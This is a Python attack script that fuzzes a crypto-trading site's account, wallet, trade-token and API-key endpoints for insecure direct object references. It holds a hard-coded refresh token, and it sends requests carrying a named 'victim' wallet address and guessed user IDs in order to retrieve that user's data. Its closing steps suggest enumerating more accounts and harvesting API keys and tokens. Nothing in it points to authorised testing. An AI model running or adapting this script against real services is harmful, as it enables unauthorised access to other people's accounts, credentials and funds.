#!/usr/bin/env python3
"""
UID PARAMETER INJECTION FUZZER
Find the endpoint where we can inject victim user_id/wallet and get their data
"""
import json
import requests
from datetime import datetime

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260714-2119-c913141",
    "from_app": "gmgn",
    "app_ver": "20260714-2119-c913141",
    "tz_name": "America/New_York",
    "tz_offset": "-18000",
    "app_lang": "en-US",
    "os": "web",
}

try:
    with open("cookies.json") as f:
        COOKIES = json.load(f)
except:
    COOKIES = {}

# Account A credentials - REFRESH TOKEN
REFRESH_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNC0yMTE5LWM5MTMxNDEiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NjU2NjEyLCJpYXQiOjE3ODQwNjQ2MTIsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTk0NzA5OTctZmQxMC00YmE2LWEyYTAtMzExODUwNTNhMTM2IiwibmJmIjoxNzg0MDY0NjEyLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.H47Vj56YK1CYK08BpclIOKLFrootpc9Aud5BYkADA4GulAD2uaSEtwA5JYUG2Pj_PQak431Fk47_Q2R9rt4CSg"

def refresh_access_token():
    """Get fresh access token using refresh token"""
    print(f"\n[*] Token expired - refreshing...")
    try:
        r = requests.post(
            "https://gmgn.ai/account/account/refresh_access_token",
            params=PARAMS,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
            cookies=COOKIES if COOKIES else {},
            json={"refresh_token": REFRESH_TOKEN},
            timeout=15
        )
        if r.status_code == 200:
            d = r.json()
            if d.get("code") == 0:
                token = d.get("data", {}).get("data", {}).get("token")
                print(f"✅ Got fresh token: {token[:50]}...")
                return token
        print(f"❌ Refresh failed: {r.text[:200]}")
    except Exception as e:
        print(f"❌ Exception: {e}")
    return None

# Try to refresh token
ACCESS_TOKEN = refresh_access_token()
if not ACCESS_TOKEN:
    print("❌ CRITICAL: Can't refresh token. Need fresh refresh_token from Jack.")
    exit(1)

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

# VICTIM TARGETS - Account B
VICTIM_SOL_WALLET = "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"
VICTIM_USER_ID = None  # We'll try to find this

# Our data for comparison
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"
OUR_SOL_WALLET = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"

print("="*80)
print("🔥 UID PARAMETER INJECTION FUZZER")
print("="*80)
print(f"Goal: Find endpoint that accepts victim user_id/wallet and returns their data")
print(f"Our User ID: {OUR_USER_ID}")
print(f"Our Wallet: {OUR_SOL_WALLET}")
print(f"Victim Wallet: {VICTIM_SOL_WALLET}")
print("="*80)

results = []

def test_endpoint(name, method, url, payloads, description):
    """Test an endpoint with multiple payload variations"""
    print(f"\n{'='*80}")
    print(f"TEST: {name}")
    print(f"{'='*80}")
    print(f"{description}")
    print(f"{method} {url}")
    
    for i, payload in enumerate(payloads, 1):
        print(f"\n[Attempt {i}/{len(payloads)}] Payload: {json.dumps(payload)}")
        
        try:
            if method == "POST":
                r = requests.post(url, headers=HEADERS, cookies=COOKIES, json=payload, timeout=10)
            elif method == "GET":
                r = requests.get(url, headers=HEADERS, cookies=COOKIES, params=payload, timeout=10)
            
            print(f"Status: {r.status_code}")
            
            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"Response Code: {data.get('code')}")
                    
                    # Check if we got victim data
                    response_str = json.dumps(data).lower()
                    
                    if VICTIM_SOL_WALLET.lower() in response_str:
                        print(f"\n🔥🔥🔥 VICTIM WALLET FOUND IN RESPONSE!")
                        print(f"Full response: {json.dumps(data, indent=2)[:1000]}")
                        results.append({
                            "endpoint": url,
                            "method": method,
                            "payload": payload,
                            "success": True,
                            "response": data
                        })
                        return True
                    
                    # Check for other victim indicators
                    if data.get("code") == 0:
                        print(f"✅ Success response")
                        
                        # Look for user data
                        if "user_id" in response_str or "wallet" in response_str or "address" in response_str:
                            print(f"Response preview: {json.dumps(data, indent=2)[:500]}")
                            
                            # Save for analysis
                            results.append({
                                "endpoint": url,
                                "method": method,
                                "payload": payload,
                                "success": True,
                                "response": data
                            })
                    else:
                        print(f"Error: {data.get('message')}")
                        
                except json.JSONDecodeError:
                    print(f"Non-JSON response: {r.text[:200]}")
            else:
                print(f"Error response: {r.text[:200]}")
                
        except Exception as e:
            print(f"Exception: {e}")
    
    return False

# ============================================================================
# TEST MATRIX - Every endpoint that might accept user_id/wallet injection
# ============================================================================

print("\n" + "="*80)
print("PHASE 1: WALLET-BASED ENDPOINTS")
print("="*80)

# TEST 1: User info with wallet parameter
test_endpoint(
    name="User Info by Wallet",
    method="POST",
    url="https://gmgn.ai/account/user_info",
    payloads=[
        {"wallet_address": VICTIM_SOL_WALLET},
        {"address": VICTIM_SOL_WALLET},
        {"from_address": VICTIM_SOL_WALLET},
        {"sol_address": VICTIM_SOL_WALLET},
    ],
    description="Try to get user_info for victim wallet"
)

# TEST 2: Wallet list with address filter
test_endpoint(
    name="Wallet List by Address",
    method="POST",
    url="https://gmgn.ai/account/wallet/list",
    payloads=[
        {"wallet_address": VICTIM_SOL_WALLET},
        {"address": VICTIM_SOL_WALLET},
        {"filter": {"address": VICTIM_SOL_WALLET}},
    ],
    description="Try to get wallet info for victim address"
)

# TEST 3: Trade token by wallet
test_endpoint(
    name="Trade Token by Wallet",
    method="POST",
    url="https://gmgn.ai/account/trade_token",
    payloads=[
        {"wallet_address": VICTIM_SOL_WALLET, "secret": "any"},
        {"wallet_address": VICTIM_SOL_WALLET, "chain": "sol"},
    ],
    description="Try to get trade_token for victim wallet"
)

# TEST 4: Wallet owner lookup
test_endpoint(
    name="Get Wallet Owner",
    method="POST",
    url="https://gmgn.ai/defi/quotation/v1/wallet/owner",
    payloads=[
        {"address": VICTIM_SOL_WALLET},
        {"wallet_address": VICTIM_SOL_WALLET},
        {"from_address": VICTIM_SOL_WALLET},
    ],
    description="Find user_id that owns this wallet"
)

# TEST 5: Trading bot wallet info
test_endpoint(
    name="Trading Bot Wallet Info",
    method="POST",
    url="https://gmgn.ai/tapi/v1/trading_bot/wallet/info",
    payloads=[
        {"wallet_address": VICTIM_SOL_WALLET, "chain": "sol"},
        {"address": VICTIM_SOL_WALLET, "chain": "sol"},
    ],
    description="Get trading bot info for victim wallet"
)

print("\n" + "="*80)
print("PHASE 2: WALLET-TO-USER_ID DISCOVERY")
print("="*80)

# TEST 6: Referral info by wallet
test_endpoint(
    name="Referral Info by Wallet",
    method="POST",
    url="https://gmgn.ai/defi/quotation/v1/invite/get_user_invitation_info",
    payloads=[
        {"wallet_address": VICTIM_SOL_WALLET},
        {"from_address": VICTIM_SOL_WALLET},
        {"address": VICTIM_SOL_WALLET},
    ],
    description="Get referral info (might leak user_id)"
)

# TEST 7: Cashback pending by wallet
test_endpoint(
    name="Cashback Pending Info",
    method="GET",
    url="https://gmgn.ai/rebate/api/v1/cashback/pending",
    payloads=[
        {"address": VICTIM_SOL_WALLET, "chain": "sol"},
        {"wallet_address": VICTIM_SOL_WALLET, "chain": "sol"},
    ],
    description="Get cashback info (returns user_id for wallet)"
)

# TEST 8: API keys by wallet
test_endpoint(
    name="API Keys by Wallet",
    method="GET",
    url="https://gmgn.ai/api/v1/openapi/keys",
    payloads=[
        {"wallet_address": VICTIM_SOL_WALLET},
        {"address": VICTIM_SOL_WALLET},
    ],
    description="Try to get API keys for wallet owner"
)

# TEST 9: Trading history by wallet
test_endpoint(
    name="Trading History by Wallet",
    method="GET",
    url="https://gmgn.ai/api/v1/trade/smart/history",
    payloads=[
        {"wallet_address": VICTIM_SOL_WALLET},
        {"from_address": VICTIM_SOL_WALLET},
    ],
    description="Get trading history for victim wallet"
)

# TEST 10: Account settings by wallet
test_endpoint(
    name="Account Settings by Wallet",
    method="POST",
    url="https://gmgn.ai/account/settings/get",
    payloads=[
        {"wallet_address": VICTIM_SOL_WALLET},
        {"address": VICTIM_SOL_WALLET},
    ],
    description="Get account settings for wallet"
)

print("\n" + "="*80)
print("PHASE 3: USER_ID ENUMERATION")
print("="*80)

# Generate test user_ids (UUIDv4 format)
test_user_ids = [
    "00000000-0000-0000-0000-000000000001",
    "00000000-0000-0000-0000-000000000002",
    "11111111-1111-1111-1111-111111111111",
    OUR_USER_ID,  # Our own to establish baseline
]

# TEST 11: User info by user_id
for test_uid in test_user_ids:
    test_endpoint(
        name=f"User Info by UID ({test_uid[:8]})",
        method="POST",
        url="https://gmgn.ai/account/user_info",
        payloads=[
            {"user_id": test_uid},
            {"userId": test_uid},
            {"id": test_uid},
        ],
        description=f"Get user_info for user_id {test_uid}"
    )

# TEST 12: API keys by user_id
for test_uid in test_user_ids[:2]:  # Just test first 2
    test_endpoint(
        name=f"API Keys by UID",
        method="GET",
        url="https://gmgn.ai/api/v1/openapi/keys",
        payloads=[
            {"user_id": test_uid},
            {"userId": test_uid},
        ],
        description=f"Get API keys for user_id {test_uid}"
    )

print("\n" + "="*80)
print("PHASE 4: AUTHORIZATION HEADER MANIPULATION")
print("="*80)

# TEST 13: Modify Authorization header with victim wallet
print("\nTEST: Authorization Header with Wallet Suffix")
test_headers = HEADERS.copy()
test_headers["Authorization"] = f"Bearer {ACCESS_TOKEN}"
test_headers["X-Wallet-Address"] = VICTIM_SOL_WALLET

try:
    r = requests.post(
        "https://gmgn.ai/account/user_info",
        headers=test_headers,
        cookies=COOKIES,
        json={},
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        data = r.json()
        print(f"Response: {json.dumps(data, indent=2)[:500]}")
except Exception as e:
    print(f"Error: {e}")

# TEST 14: Query parameters with wallet
print("\nTEST: Query Parameters with Wallet")
try:
    r = requests.post(
        f"https://gmgn.ai/account/user_info?wallet_address={VICTIM_SOL_WALLET}",
        headers=HEADERS,
        cookies=COOKIES,
        json={},
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        data = r.json()
        if VICTIM_SOL_WALLET in json.dumps(data):
            print(f"🔥 VICTIM WALLET IN RESPONSE!")
            print(f"Response: {json.dumps(data, indent=2)[:500]}")
except Exception as e:
    print(f"Error: {e}")

# ============================================================================
# RESULTS SUMMARY
# ============================================================================

print("\n" + "="*80)
print("📊 RESULTS SUMMARY")
print("="*80)

if results:
    print(f"\n✅ Found {len(results)} potential IDOR vectors:\n")
    for i, r in enumerate(results, 1):
        print(f"{i}. {r['method']} {r['endpoint']}")
        print(f"   Payload: {json.dumps(r['payload'])}")
        print(f"   Success: {r.get('success')}")
        print()
else:
    print("\n⚠️  No obvious IDOR vectors found in standard endpoints")
    print("   This means we need to:")
    print("   1. Find the wallet→user_id mapping endpoint")
    print("   2. Test authenticated endpoints with victim user_id")
    print("   3. Look for hidden parameters in responses")

# Save results
with open("uid_fuzzing_results.json", "w") as f:
    json.dump({
        "timestamp": str(datetime.now()),
        "our_user_id": OUR_USER_ID,
        "our_wallet": OUR_SOL_WALLET,
        "victim_wallet": VICTIM_SOL_WALLET,
        "results": results
    }, f, indent=2)

print(f"\n💾 Full results saved to uid_fuzzing_results.json")

print("\n" + "="*80)
print("NEXT STEPS")
print("="*80)
print("1. Check the results JSON for any endpoint that returned victim data")
print("2. If we found user_id→wallet mapping, use it to enumerate more accounts")
print("3. Test the working endpoint with different payloads")
print("4. Look for secondary IDOR in responses (API keys, tokens, etc.)")
